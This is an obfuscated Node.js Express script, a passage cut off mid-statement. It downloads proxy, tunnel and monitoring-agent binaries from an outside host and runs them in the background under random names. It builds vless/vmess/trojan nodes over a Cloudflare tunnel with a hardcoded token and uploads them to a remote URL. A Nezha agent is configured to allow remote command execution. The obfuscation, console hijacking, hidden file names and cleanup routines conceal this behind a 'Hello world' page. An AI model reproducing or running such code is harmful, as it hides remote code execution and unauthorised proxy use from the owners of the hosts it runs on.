const _0x482514=_0x59c6;(function(_0x512f39,_0x29dd96){const _0x14e054=_0x59c6,_0x4e2fc0=_0x512f39();while(!![]){try{const _0x1e1259=-parseInt(_0x14e054(0xaa))/0x1+parseInt(_0x14e054(0xa4))/0x2*(parseInt(_0x14e054(0x79))/0x3)+-parseInt(_0x14e054(0x90))/0x4+parseInt(_0x14e054(0x120))/0x5*(parseInt(_0x14e054(0x95))/0x6)+parseInt(_0x14e054(0xb4))/0x7*(-parseInt(_0x14e054(0xb3))/0x8)+-parseInt(_0x14e054(0xe9))/0x9*(-parseInt(_0x14e054(0xf7))/0xa)+parseInt(_0x14e054(0xc2))/0xb;if(_0x1e1259===_0x29dd96)break;else _0x4e2fc0['push'](_0x4e2fc0['shift']());}catch(_0x59c244){_0x4e2fc0['push'](_0x4e2fc0['shift']());}}}(_0x34cb,0xc1c07));const _0x36ac59=(function(){let _0x5a3350=!![];return function(_0x33594f,_0x572e70){const _0x34f863=_0x5a3350?function(){const _0x35d756=_0x59c6;if(_0x572e70){const _0x501770=_0x572e70[_0x35d756(0x76)](_0x33594f,arguments);return _0x572e70=null,_0x501770;}}:function(){};return _0x5a3350=![],_0x34f863;};}()),_0x60541b=_0x36ac59(this,function(){const _0x5737a6=_0x59c6;return _0x60541b[_0x5737a6(0xff)]()[_0x5737a6(0xbd)](_0x5737a6(0xa6))[_0x5737a6(0xff)]()[_0x5737a6(0xf2)](_0x60541b)[_0x5737a6(0xbd)](_0x5737a6(0xa6));});_0x60541b();const _0x177a02=(function(){let _0x4b8c1e=!![];return function(_0x4a1875,_0x1134df){const _0x534d75=_0x4b8c1e?function(){const _0x40e9a7=_0x59c6;if(_0x1134df){const _0x4e6839=_0x1134df[_0x40e9a7(0x76)](_0x4a1875,arguments);return _0x1134df=null,_0x4e6839;}}:function(){};return _0x4b8c1e=![],_0x534d75;};}()),_0x3262b2=_0x177a02(this,function(){const _0x2c3ad7=_0x59c6,_0x1dca2a=function(){const _0x29aac1=_0x59c6;let _0x516b13;try{_0x516b13=Function('return\x20(function()\x20'+_0x29aac1(0xc5)+');')();}catch(_0x14df82){_0x516b13=window;}return _0x516b13;},_0x497944=_0x1dca2a(),_0x236dc4=_0x497944[_0x2c3ad7(0xc8)]=_0x497944[_0x2c3ad7(0xc8)]||{},_0x33070a=[_0x2c3ad7(0xe5),'warn',_0x2c3ad7(0x92),_0x2c3ad7(0x136),'exception',_0x2c3ad7(0x10f),_0x2c3ad7(0xb0)];for(let _0x5ccca1=0x0;_0x5ccca1<_0x33070a[_0x2c3ad7(0x11b)];_0x5ccca1++){const _0x442bec=_0x177a02[_0x2c3ad7(0xf2)]['prototype']['bind'](_0x177a02),_0x10946f=_0x33070a[_0x5ccca1],_0x5a184d=_0x236dc4[_0x10946f]||_0x442bec;_0x442bec['__proto__']=_0x177a02[_0x2c3ad7(0x9f)](_0x177a02),_0x442bec[_0x2c3ad7(0xff)]=_0x5a184d[_0x2c3ad7(0xff)][_0x2c3ad7(0x9f)](_0x5a184d),_0x236dc4[_0x10946f]=_0x442bec;}});_0x3262b2();const express=require('express'),app=express(),axios=require(_0x482514(0x8a)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x482514(0xb7)),exec=promisify(require(_0x482514(0x86))['exec']),UPLOAD_URL=process.env.UPLOAD_URL||'',PROJECT_URL=process.env.PROJECT_URL||'',AUTO_ACCESS=process.env.AUTO_ACCESS||![],FILE_PATH=process.env.FILE_PATH||_0x482514(0x101),SUB_PATH=process.env.SUB_PATH||_0x482514(0xc6),PORT=process.env.SERVER_PORT||process.env.PORT||0xbb8,UUID=process.env.UUID||'ecd5d355-6a02-4f83-a9ab-5c68c8f14a5d',NEZHA_SERVER=process.env.NEZHA_SERVER||'',NEZHA_PORT=process.env.NEZHA_PORT||'',NEZHA_KEY=process.env.NEZHA_KEY||'',ARGO_DOMAIN=process.env.ARGO_DOMAIN||_0x482514(0x72),ARGO_AUTH=process.env.ARGO_AUTH||_0x482514(0xfc),ARGO_PORT=process.env.ARGO_PORT||0x1f41,CFIP=process.env.CFIP||'saas.sin.fan',CFPORT=process.env.CFPORT||0x1bb,NAME=process.env.NAME||_0x482514(0x9b);!fs['existsSync'](FILE_PATH)?(fs[_0x482514(0xb2)](FILE_PATH),console[_0x482514(0xe5)](FILE_PATH+_0x482514(0xd1))):console[_0x482514(0xe5)](FILE_PATH+_0x482514(0x125));function generateRandomName(){const _0x573139=_0x482514,_0x27e939='abcdefghijklmnopqrstuvwxyz';let _0x5e2fa9='';for(let _0x177899=0x0;_0x177899<0x6;_0x177899++){_0x5e2fa9+=_0x27e939['charAt'](Math[_0x573139(0x127)](Math[_0x573139(0xdf)]()*_0x27e939[_0x573139(0x11b)]));}return _0x5e2fa9;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x482514(0x8b)](FILE_PATH,npmName),phpPath=path[_0x482514(0x8b)](FILE_PATH,phpName),webPath=path[_0x482514(0x8b)](FILE_PATH,webName),botPath=path[_0x482514(0x8b)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x482514(0x10c)),listPath=path[_0x482514(0x8b)](FILE_PATH,_0x482514(0x108)),bootLogPath=path[_0x482514(0x8b)](FILE_PATH,_0x482514(0xa5)),configPath=path[_0x482514(0x8b)](FILE_PATH,_0x482514(0xfe));function deleteNodes(){const _0x5d175f=_0x482514;try{if(!UPLOAD_URL)return;if(!fs[_0x5d175f(0x12f)](subPath))return;let _0x53d66e;try{_0x53d66e=fs['readFileSync'](subPath,'utf-8');}catch{return null;}const _0x212d32=Buffer[_0x5d175f(0xe8)](_0x53d66e,_0x5d175f(0xeb))[_0x5d175f(0xff)](_0x5d175f(0xf4)),_0x28bd04=_0x212d32[_0x5d175f(0xba)]('\x0a')[_0x5d175f(0xd7)](_0x3ecd46=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x5d175f(0x11a)](_0x3ecd46));if(_0x28bd04[_0x5d175f(0x11b)]===0x0)return;return axios[_0x5d175f(0x96)](UPLOAD_URL+_0x5d175f(0xb6),JSON['stringify']({'nodes':_0x28bd04}),{'headers':{'Content-Type':_0x5d175f(0x77)}})[_0x5d175f(0xa9)](_0x4320e2=>{return null;}),null;}catch(_0x35255a){return null;}}function _0x34cb(){const _0x3bfd5f=['stream','arm','fileUrl','8016HALfFI','boot.log','(((.+)+)+)+$','\x20failed:\x20','set','catch','560565bjZbmK','--tls','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','message','vless','unlinkSync','trace','2083','mkdirSync','328AjduYz','161231MGzYXh','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','/api/delete-nodes','util','match','2087','split','substring','.exe\x20>\x20nul\x202>&1','search','text/plain;\x20charset=utf-8','tunnel.yml','\x0a\x0atrojan://','pkill\x20-f\x20\x22[','13493348lTQGjg','Nodes\x20uploaded\x20successfully','listen','{}.constructor(\x22return\x20this\x22)(\x20)','sub','\x0a\x20\x20credentials-file:\x20','console','\x20-s\x20','basename','false','Mozilla/5.0','country_code','trojan','\x0a\x20\x20\x20\x20','nohup\x20','\x20is\x20created','direct','tls','org','http','\x0aclient_secret:\x20','filter','xtls-rprx-vision','close','win32','promises','push','127.0.0.1','map','random','&path=%2Ftrojan-argo%3Fed%3D2560#','forEach','pipe','utf8','?encryption=none&security=tls&sni=','log','Error\x20executing\x20command:\x20','Empowerment\x20failed\x20for\x20','from','749988QdCdwh','block','base64','Content-Type','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','all','Empowerment\x20success\x20for\x20','\x20>/dev/null\x202>&1\x20&','php\x20running\x20error:\x20','constructor','clear','utf-8','unshift','https://amd64.ssss.nyc.mn/bot','20xaiETx','8443','platform','/tunnel.yml\x20run','\x20is\x20running','eyJhIjoiNTk3ZmI4ZDY0MjVkMGY2Y2E4NTMxOGNlOTMzN2NlY2UiLCJ0IjoiNTFlNTU3MGItOTg0ZC00YWExLTk4M2YtODgwZTQ4NDgxNzUwIiwicyI6IllqUmtZVE0yWkRVdFlqaGtNUzAwTkRFeExUZzNORGN0TVRNNVptTmpZemc0WmprNSJ9','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','config.json','toString','https://arm64.ssss.nyc.mn/web','.tmp','firefox','Unhandled\x20error\x20in\x20startserver:','\x0avless://','/api/add-subscriptions','taskkill\x20/f\x20/im\x20','ArgoDomain:','list.txt','Unknown','https://arm64.ssss.nyc.mn/agent','finish','sub.txt','status','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','table','\x20-c\x20','Download\x20','readFileSync','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','auto','arm64','send','del\x20/f\x20/q\x20','/dev/null','test','length','Error\x20downloading\x20files:','stringify','aarch64','chmod','461345jGYWNm','https://api.ip.sb/geoip','https://oooo.serv00.net/add-url','\x20>\x20nul\x202>&1','\x20-c\x20\x22','\x20already\x20exists','ARGO_DOMAIN:','floor','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','freedom','/sub.txt\x20saved\x20successfully','\x0a\x20\x20tunnel:\x20','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','readdirSync','includes','existsSync','createWriteStream','quic','/config.json\x20>/dev/null\x202>&1\x20&','https://amd64.ssss.nyc.mn/agent','charAt','writeFileSync','error','http\x20server\x20is\x20running\x20on\x20port:','/api/add-nodes','&fp=firefox&type=ws&host=','data','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','/vmess-argo','2023jiucai.mentu.dpdns.org','replace','rm\x20-rf\x20','tcp','apply','application/json','isp','831pOawzj','https://arm64.ssss.nyc.mn/bot','true','Hello\x20world!<br><br>You\x20can\x20access\x20/{SUB_PATH}(Default:\x20/sub)\x20to\x20get\x20your\x20nodes!','?security=tls&sni=','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','config.yaml','Add\x20automatic\x20access\x20task\x20faild:\x20','\x20>/dev/null\x202>&1','Subscription\x20uploaded\x20successfully','none','tunnel.json','get','child_process','&path=%2Fvless-argo%3Fed%3D2560#','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','2096','axios','join','/vless-argo','response','Error\x20in\x20startserver:','App\x20is\x20running','1189168dDjcSR','automatic\x20access\x20task\x20added\x20successfully','info','https+local://8.8.8.8/dns-query','npm\x20running\x20error:\x20','6OWxjFH','post','statSync','has','\x0a\x0avmess://','success','mentu2023','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','fileName','index.html','bind','\x20-p\x20'];_0x34cb=function(){return _0x3bfd5f;};return _0x34cb();}function cleanupOldFiles(){const _0x4076a0=_0x482514;try{const _0x129f63=fs[_0x4076a0(0x12d)](FILE_PATH);_0x129f63[_0x4076a0(0xe1)](_0x4ea057=>{const _0xd7d1cb=_0x4076a0,_0x2a5238=path['join'](FILE_PATH,_0x4ea057);try{const _0x28e967=fs[_0xd7d1cb(0x97)](_0x2a5238);_0x28e967['isFile']()&&fs['unlinkSync'](_0x2a5238);}catch(_0x5f264c){}});}catch(_0x144543){}}function _0x59c6(_0x46a935,_0x16d258){_0x46a935=_0x46a935-0x6e;const _0x35760d=_0x34cb();let _0x3262b2=_0x35760d[_0x46a935];return _0x3262b2;}async function generateConfig(){const _0x1889f5=_0x482514,_0x3fc0a8={'log':{'access':_0x1889f5(0x119),'error':_0x1889f5(0x119),'loglevel':_0x1889f5(0x83)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x1889f5(0xae),'settings':{'clients':[{'id':UUID,'flow':_0x1889f5(0xd8)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x1889f5(0x8c),'dest':0xbba},{'path':_0x1889f5(0x71),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x1889f5(0x75)}},{'port':0xbb9,'listen':_0x1889f5(0xdd),'protocol':_0x1889f5(0xae),'settings':{'clients':[{'id':UUID}],'decryption':_0x1889f5(0x83)},'streamSettings':{'network':_0x1889f5(0x75),'security':_0x1889f5(0x83)}},{'port':0xbba,'listen':_0x1889f5(0xdd),'protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x1889f5(0x83)},'streamSettings':{'network':'ws','security':_0x1889f5(0x83),'wsSettings':{'path':_0x1889f5(0x8c)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x1889f5(0xd3),_0x1889f5(0x131)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x1889f5(0xdd),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x1889f5(0xd5),'tls',_0x1889f5(0x131)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x1889f5(0xdd),'protocol':_0x1889f5(0xce),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x1889f5(0x83),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x1889f5(0xd5),'tls',_0x1889f5(0x131)],'metadataOnly':![]}}],'dns':{'servers':[_0x1889f5(0x93)]},'outbounds':[{'protocol':_0x1889f5(0x129),'tag':_0x1889f5(0xd2)},{'protocol':'blackhole','tag':_0x1889f5(0xea)}]};fs[_0x1889f5(0x135)](path[_0x1889f5(0x8b)](FILE_PATH,_0x1889f5(0xfe)),JSON[_0x1889f5(0x11d)](_0x3fc0a8,null,0x2));}function getSystemArchitecture(){const _0x156bbd=_0x482514,_0x55d178=os['arch']();return _0x55d178==='arm'||_0x55d178===_0x156bbd(0x116)||_0x55d178===_0x156bbd(0x11e)?_0x156bbd(0xa2):'amd';}function downloadFile(_0x449e8e,_0x2e94ee,_0x50069b){const _0xf4eb93=_0x482514,_0x5924e9=_0x449e8e;!fs[_0xf4eb93(0x12f)](FILE_PATH)&&fs[_0xf4eb93(0xb2)](FILE_PATH,{'recursive':!![]});const _0x17b288=fs[_0xf4eb93(0x130)](_0x5924e9);axios({'method':'get','url':_0x2e94ee,'responseType':_0xf4eb93(0xa1)})['then'](_0x5a4d20=>{const _0x3b42eb=_0xf4eb93;_0x5a4d20[_0x3b42eb(0x6f)][_0x3b42eb(0xe2)](_0x17b288),_0x17b288['on'](_0x3b42eb(0x10b),()=>{const _0xc7651f=_0x3b42eb;_0x17b288[_0xc7651f(0xd9)](),console['log'](_0xc7651f(0x111)+path['basename'](_0x5924e9)+'\x20successfully'),_0x50069b(null,_0x5924e9);}),_0x17b288['on'](_0x3b42eb(0x136),_0x4bdec9=>{const _0x175a35=_0x3b42eb;fs['unlink'](_0x5924e9,()=>{});const _0x5103af='Download\x20'+path[_0x175a35(0xca)](_0x5924e9)+_0x175a35(0xa7)+_0x4bdec9[_0x175a35(0xad)];console[_0x175a35(0x136)](_0x5103af),_0x50069b(_0x5103af);});})[_0xf4eb93(0xa9)](_0x3b6201=>{const _0x5cd9e2=_0xf4eb93,_0x40e573=_0x5cd9e2(0x111)+path[_0x5cd9e2(0xca)](_0x5924e9)+_0x5cd9e2(0xa7)+_0x3b6201[_0x5cd9e2(0xad)];console['error'](_0x40e573),_0x50069b(_0x40e573);});}async function downloadFilesAndRun(){const _0x54d651=_0x482514,_0x480950=getSystemArchitecture(),_0x5e97b5=getFilesForArchitecture(_0x480950);if(_0x5e97b5[_0x54d651(0x11b)]===0x0){console[_0x54d651(0xe5)](_0x54d651(0x128));return;}const _0x3d9ac0=_0x5e97b5[_0x54d651(0xde)](_0x1c7f1c=>{return new Promise((_0x5198cc,_0x4fd6cc)=>{const _0x362766=_0x59c6;downloadFile(_0x1c7f1c[_0x362766(0x9d)],_0x1c7f1c[_0x362766(0xa3)],(_0x141685,_0x1dc6dd)=>{_0x141685?_0x4fd6cc(_0x141685):_0x5198cc(_0x1dc6dd);});});});try{await Promise[_0x54d651(0xee)](_0x3d9ac0);}catch(_0x807606){console['error'](_0x54d651(0x11c),_0x807606);return;}function _0x27a80a(_0xa8b2e2){const _0x3bbd8a=0x1fd;_0xa8b2e2['forEach'](_0x349af1=>{const _0x4c2032=_0x59c6;fs[_0x4c2032(0x12f)](_0x349af1)&&fs[_0x4c2032(0x11f)](_0x349af1,_0x3bbd8a,_0x423ebb=>{const _0xfabdf6=_0x4c2032;_0x423ebb?console[_0xfabdf6(0x136)](_0xfabdf6(0xe7)+_0x349af1+':\x20'+_0x423ebb):console[_0xfabdf6(0xe5)](_0xfabdf6(0xef)+_0x349af1+':\x20'+_0x3bbd8a[_0xfabdf6(0xff)](0x8));});});}const _0x5c6bb7=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x27a80a(_0x5c6bb7);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3ec38a=NEZHA_SERVER[_0x54d651(0x12e)](':')?NEZHA_SERVER['split'](':')['pop']():'',_0x48a01b=new Set(['443',_0x54d651(0xf8),'2096','2087',_0x54d651(0xb1),'2053']),_0x31b2be=_0x48a01b[_0x54d651(0x98)](_0x3ec38a)?_0x54d651(0x7b):_0x54d651(0xcb),_0x469439=_0x54d651(0xd6)+NEZHA_KEY+_0x54d651(0x88)+NEZHA_SERVER+_0x54d651(0xac)+_0x31b2be+_0x54d651(0x114)+UUID;fs[_0x54d651(0x135)](path['join'](FILE_PATH,_0x54d651(0x7f)),_0x469439);const _0x1aff7a='nohup\x20'+phpPath+_0x54d651(0x124)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x1aff7a),console[_0x54d651(0xe5)](phpName+'\x20is\x20running'),await new Promise(_0x13d3f2=>setTimeout(_0x13d3f2,0x3e8));}catch(_0xf3ef41){console[_0x54d651(0x136)](_0x54d651(0xf1)+_0xf3ef41);}}else{let _0x2a794d='';const _0x5c99b7=['443',_0x54d651(0xf8),_0x54d651(0x89),_0x54d651(0xb9),_0x54d651(0xb1),'2053'];_0x5c99b7[_0x54d651(0x12e)](NEZHA_PORT)&&(_0x2a794d=_0x54d651(0xab));const _0x51b78a='nohup\x20'+npmPath+_0x54d651(0xc9)+NEZHA_SERVER+':'+NEZHA_PORT+_0x54d651(0xa0)+NEZHA_KEY+'\x20'+_0x2a794d+_0x54d651(0x12c);try{await exec(_0x51b78a),console[_0x54d651(0xe5)](npmName+'\x20is\x20running'),await new Promise(_0xe71644=>setTimeout(_0xe71644,0x3e8));}catch(_0xc725cd){console['error'](_0x54d651(0x94)+_0xc725cd);}}}else console[_0x54d651(0xe5)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x5698c1=_0x54d651(0xd0)+webPath+_0x54d651(0x110)+FILE_PATH+_0x54d651(0x132);try{await exec(_0x5698c1),console[_0x54d651(0xe5)](webName+_0x54d651(0xfb)),await new Promise(_0x596dab=>setTimeout(_0x596dab,0x3e8));}catch(_0x44a932){console[_0x54d651(0x136)]('web\x20running\x20error:\x20'+_0x44a932);}if(fs[_0x54d651(0x12f)](botPath)){let _0x58fa86;if(ARGO_AUTH[_0x54d651(0xb8)](/^[A-Z0-9a-z=]{120,250}$/))_0x58fa86=_0x54d651(0xfd)+ARGO_AUTH;else ARGO_AUTH[_0x54d651(0xb8)](/TunnelSecret/)?_0x58fa86=_0x54d651(0x7e)+FILE_PATH+_0x54d651(0xfa):_0x58fa86=_0x54d651(0x10e)+FILE_PATH+_0x54d651(0x9c)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x58fa86+'\x20>/dev/null\x202>&1\x20&'),console[_0x54d651(0xe5)](botName+_0x54d651(0xfb)),await new Promise(_0x4f98ad=>setTimeout(_0x4f98ad,0x7d0));}catch(_0x3eb93e){console[_0x54d651(0x136)](_0x54d651(0xe6)+_0x3eb93e);}}await new Promise(_0x4eac2d=>setTimeout(_0x4eac2d,0x1388));}function getFilesForArchitecture(_0x2d7254){const _0x2b5648=_0x482514;let _0x59a2b6;_0x2d7254==='arm'?_0x59a2b6=[{'fileName':webPath,'fileUrl':_0x2b5648(0x100)},{'fileName':botPath,'fileUrl':_0x2b5648(0x7a)}]:_0x59a2b6=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x2b5648(0xf6)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x2aac9a=_0x2d7254===_0x2b5648(0xa2)?_0x2b5648(0x10a):_0x2b5648(0x133);_0x59a2b6[_0x2b5648(0xf5)]({'fileName':npmPath,'fileUrl':_0x2aac9a});}else{const _0x2fcab7=_0x2d7254===_0x2b5648(0xa2)?'https://arm64.ssss.nyc.mn/v1':'https://amd64.ssss.nyc.mn/v1';_0x59a2b6[_0x2b5648(0xf5)]({'fileName':phpPath,'fileUrl':_0x2fcab7});}}return _0x59a2b6;}function argoType(){const _0x4f87d0=_0x482514;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x4f87d0(0xe5)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x4f87d0(0x12e)]('TunnelSecret')){fs[_0x4f87d0(0x135)](path[_0x4f87d0(0x8b)](FILE_PATH,_0x4f87d0(0x84)),ARGO_AUTH);const _0x2e083b=_0x4f87d0(0x12b)+ARGO_AUTH[_0x4f87d0(0xba)]('\x22')[0xb]+_0x4f87d0(0xc7)+path[_0x4f87d0(0x8b)](FILE_PATH,_0x4f87d0(0x84))+_0x4f87d0(0x113)+ARGO_DOMAIN+_0x4f87d0(0xed)+ARGO_PORT+_0x4f87d0(0xb5);fs['writeFileSync'](path[_0x4f87d0(0x8b)](FILE_PATH,_0x4f87d0(0xbf)),_0x2e083b);}else console[_0x4f87d0(0xe5)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}async function extractDomains(){const _0x43d981=_0x482514;let _0x24c2f1;if(ARGO_AUTH&&ARGO_DOMAIN)_0x24c2f1=ARGO_DOMAIN,console[_0x43d981(0xe5)](_0x43d981(0x126),_0x24c2f1),await _0x33a1cd(_0x24c2f1);else try{const _0x5b3098=fs[_0x43d981(0x112)](path[_0x43d981(0x8b)](FILE_PATH,'boot.log'),'utf-8'),_0x419be6=_0x5b3098[_0x43d981(0xba)]('\x0a'),_0x26102b=[];_0x419be6[_0x43d981(0xe1)](_0x4fa138=>{const _0x57c5e8=_0x43d981,_0x2a1825=_0x4fa138[_0x57c5e8(0xb8)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x2a1825){const _0x3be9e7=_0x2a1825[0x1];_0x26102b['push'](_0x3be9e7);}});if(_0x26102b[_0x43d981(0x11b)]>0x0)_0x24c2f1=_0x26102b[0x0],console[_0x43d981(0xe5)](_0x43d981(0x107),_0x24c2f1),await _0x33a1cd(_0x24c2f1);else{console['log'](_0x43d981(0x70)),fs[_0x43d981(0xaf)](path['join'](FILE_PATH,'boot.log'));async function _0x463136(){const _0x39f882=_0x43d981;try{process['platform']===_0x39f882(0xda)?await exec(_0x39f882(0x106)+botName+_0x39f882(0xbc)):await exec(_0x39f882(0xc1)+botName[_0x39f882(0x134)](0x0)+']'+botName[_0x39f882(0xbb)](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x34f00f){}}_0x463136(),await new Promise(_0x15858e=>setTimeout(_0x15858e,0xbb8));const _0x575df8=_0x43d981(0x10e)+FILE_PATH+_0x43d981(0x9c)+ARGO_PORT;try{await exec(_0x43d981(0xd0)+botPath+'\x20'+_0x575df8+_0x43d981(0xf0)),console[_0x43d981(0xe5)](botName+'\x20is\x20running'),await new Promise(_0x13655f=>setTimeout(_0x13655f,0xbb8)),await extractDomains();}catch(_0x2f585d){console[_0x43d981(0x136)](_0x43d981(0xe6)+_0x2f585d);}}}catch(_0x5bbb0d){console[_0x43d981(0x136)]('Error\x20reading\x20boot.log:',_0x5bbb0d);}async function _0x18b482(){const _0x59d014=_0x43d981;try{const _0x36e9f5=await axios[_0x59d014(0x85)](_0x59d014(0x121),{'headers':{'User-Agent':_0x59d014(0xcc),'timeout':0xbb8}});if(_0x36e9f5[_0x59d014(0x6f)]&&_0x36e9f5[_0x59d014(0x6f)][_0x59d014(0xcd)]&&_0x36e9f5[_0x59d014(0x6f)][_0x59d014(0x78)])return(_0x36e9f5[_0x59d014(0x6f)][_0x59d014(0xcd)]+'-'+_0x36e9f5[_0x59d014(0x6f)][_0x59d014(0x78)])['replace'](/\s+/g,'_');}catch(_0x51214d){try{const _0x2e9a59=await axios['get']('http://ip-api.com/json',{'headers':{'User-Agent':_0x59d014(0xcc),'timeout':0xbb8}});if(_0x2e9a59[_0x59d014(0x6f)]&&_0x2e9a59[_0x59d014(0x6f)][_0x59d014(0x10d)]===_0x59d014(0x9a)&&_0x2e9a59[_0x59d014(0x6f)]['countryCode']&&_0x2e9a59[_0x59d014(0x6f)][_0x59d014(0xd4)])return(_0x2e9a59[_0x59d014(0x6f)]['countryCode']+'-'+_0x2e9a59[_0x59d014(0x6f)]['org'])[_0x59d014(0x73)](/\s+/g,'_');}catch(_0x4ab101){}}return _0x59d014(0x109);}async function _0x33a1cd(_0x37fd81){const _0x5798d4=await _0x18b482(),_0x3c6355=NAME?NAME+'-'+_0x5798d4:_0x5798d4;return new Promise(_0x21e847=>{setTimeout(()=>{const _0xe926c=_0x59c6,_0x58d7ad={'v':'2','ps':''+_0x3c6355,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0xe926c(0x115),'net':'ws','type':_0xe926c(0x83),'host':_0x37fd81,'path':'/vmess-argo?ed=2560','tls':_0xe926c(0xd3),'sni':_0x37fd81,'alpn':'','fp':_0xe926c(0x102)},_0x304f70=_0xe926c(0x104)+UUID+'@'+CFIP+':'+CFPORT+_0xe926c(0xe4)+_0x37fd81+_0xe926c(0x6e)+_0x37fd81+_0xe926c(0x87)+_0x3c6355+_0xe926c(0x99)+Buffer[_0xe926c(0xe8)](JSON['stringify'](_0x58d7ad))['toString'](_0xe926c(0xeb))+_0xe926c(0xc0)+UUID+'@'+CFIP+':'+CFPORT+_0xe926c(0x7d)+_0x37fd81+'&fp=firefox&type=ws&host='+_0x37fd81+_0xe926c(0xe0)+_0x3c6355+_0xe926c(0xcf);console['log'](Buffer[_0xe926c(0xe8)](_0x304f70)[_0xe926c(0xff)]('base64')),fs[_0xe926c(0x135)](subPath,Buffer['from'](_0x304f70)[_0xe926c(0xff)](_0xe926c(0xeb))),console[_0xe926c(0xe5)](FILE_PATH+_0xe926c(0x12a)),uploadNodes(),app[_0xe926c(0x85)]('/'+SUB_PATH,(_0x4fbef1,_0x477215)=>{const _0x3c8439=_0xe926c,_0x219904=Buffer['from'](_0x304f70)[_0x3c8439(0xff)](_0x3c8439(0xeb));_0x477215[_0x3c8439(0xa8)](_0x3c8439(0xec),_0x3c8439(0xbe)),_0x477215[_0x3c8439(0x117)](_0x219904);}),_0x21e847(_0x304f70);},0x7d0);});}}async function uploadNodes(){const _0x3293b6=_0x482514;if(UPLOAD_URL&&PROJECT_URL){const _0x4867c6=PROJECT_URL+'/'+SUB_PATH,_0x4938f9={'subscription':[_0x4867c6]};try{const _0x1a006f=await axios[_0x3293b6(0x96)](UPLOAD_URL+_0x3293b6(0x105),_0x4938f9,{'headers':{'Content-Type':_0x3293b6(0x77)}});return _0x1a006f&&_0x1a006f['status']===0xc8?(console[_0x3293b6(0xe5)](_0x3293b6(0x82)),_0x1a006f):null;}catch(_0x59c167){if(_0x59c167[_0x3293b6(0x8d)]){if(_0x59c167[_0x3293b6(0x8d)][_0x3293b6(0x10d)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x3293b6(0x12f)](listPath))return;const _0x2416e0=fs[_0x3293b6(0x112)](listPath,'utf-8'),_0x37cb3e=_0x2416e0['split']('\x0a')[_0x3293b6(0xd7)](_0x17c07a=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x17c07a));if(_0x37cb3e[_0x3293b6(0x11b)]===0x0)return;const _0x33645a=JSON[_0x3293b6(0x11d)]({'nodes':_0x37cb3e});try{const _0x52ce5c=await axios[_0x3293b6(0x96)](UPLOAD_URL+_0x3293b6(0x138),_0x33645a,{'headers':{'Content-Type':_0x3293b6(0x77)}});return _0x52ce5c&&_0x52ce5c[_0x3293b6(0x10d)]===0xc8?(console[_0x3293b6(0xe5)](_0x3293b6(0xc3)),_0x52ce5c):null;}catch(_0x4c0a05){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x216eb0=_0x59c6,_0x5dd98e=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x5dd98e[_0x216eb0(0xdc)](npmPath);else 